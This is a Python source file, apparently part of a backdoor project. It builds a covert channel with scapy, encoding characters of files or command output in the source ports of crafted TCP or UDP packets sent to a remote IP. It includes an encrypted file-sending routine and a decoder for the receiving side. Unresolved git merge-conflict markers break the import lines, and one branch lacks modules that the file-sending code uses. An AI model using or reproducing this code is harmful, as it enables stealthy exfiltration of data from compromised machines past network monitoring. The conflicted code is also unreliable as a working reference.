<<<<<<< HEAD
import binascii, time, os, ntpath, encryption, configfile, logging
=======
import binascii, time, os, logging
>>>>>>> 30b3bebd64668234701cf28ae5b4c77fca846edd
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

maxPort = 65535
# lastPosition = 0
# fileSize = 0

# take string and break it into chunks of length size
def chunkString(size, string):
  chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
  return chunkedString

def createPacketTwo(protocol, ip, char1, char2, port):
    # get the binary values of both chars without the binary string indicator
    binChar1 = bin(ord(char1))[2:].zfill(8)
    binChar2 = bin(ord(char2))[2:].zfill(8)
    # print binChar1 + binChar2
    # get the integer value of the concatenated binary values
    intPortVal = int(binChar1 + binChar2, 2)
    #print "bin value " + str((bin(intPortVal)))
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
    return packet

# create a packet when we only have 1 character remaining in the file
# works exactly the same as createPacketTwo except we only have one character
# returns a TCP packet created by scapy.

def createPacketOne(protocol, ip, char, port):
    # get the binary value of the character
    binChar = bin(ord(char))[2:].zfill(8)
    #print binChar
    #get the integer value of that binary value
    intPortVal = int(binChar, 2)
    # craft the packet
    if protocol == 'tcp':
        packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
    elif protocol == 'udp':
        packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
    return packet

# need comment
def parsePacket(packet):
    sport = packet.sport
    difference = maxPort - sport
    binVal = bin(difference)[2:]
    binLen = len(binVal)
    if binLen > 8:
        # binary string contains two ascii characters
        # the last 8 characters in the string are always the 2nd character
        binChar2 = binVal[-8:]
        # python trims leading zeroes at the start of our concatenated binary string
        binChar1 = binVal[0:binLen - 8]
        char1 = chr(int(binChar1, 2))
        char2 = chr(int(binChar2, 2))
        #print "Received: " + char1 + char2
        return str(char1 + char2)
    else:
        # binary string contains one ascii character
        char = chr(int(binVal, 2))
        #print "Received: " + char
        return str(char)

# we should pass the encrypted password + string (command results or something else)
def sendMessage(message, password, protocol, ip, port):
  lastIndex = len(message) - 1
  for index, char in enumerate(message):
    packet = createPacketOne(protocol, ip, char, port)
    if index ==  lastIndex:
      packet = packet/Raw(load=password)
    send(packet, verbose=0)
    time.sleep(0.1) # we should check if this is actually necessary

def readOneByte(fileDescriptor):
    global lastPosition
    fileDescriptor.seek(lastPosition)
    byte = fileDescriptor.read(1)
    lastPosition = fileDescriptor.tell()
    return byte

# def sendFile(ip, filePath, protocol, port, password):
#     global lastPosition
#     global fileSize
#     fileSize = os.path.getsize(filePath)
#     fileDescriptor = open(filePath, 'rb')
#     while lastPosition < fileSize:
#         if lastPosition == fileSize -1:
#             char = readOneByte(fileDescriptor)
#             packet = createPacketOne(protocol, ip, char, port)
#         else:
#             char1 = readOneByte(fileDescriptor)
#             char2 = readOneByte(fileDescriptor)
#             packet = createPacketTwo(protocol, ip, char1, char2, port)
#         if lastPosition == fileSize:
#             packet = packet/Raw(load=password)
#         send(packet, verbose = 0)
#         time.sleep(0.5)

def sendFile(ip, filePath, protocol, port, password):
    fileDescriptor = open(filePath, 'rb')
    header = ntpath.basename(filePath) + '\0'
    data = header + fileDescriptor.read()
    encryptedData = encryption.encrypt(data, configfile.masterkey)
    sendMessage(encryptedData, password, protocol, ip, port)
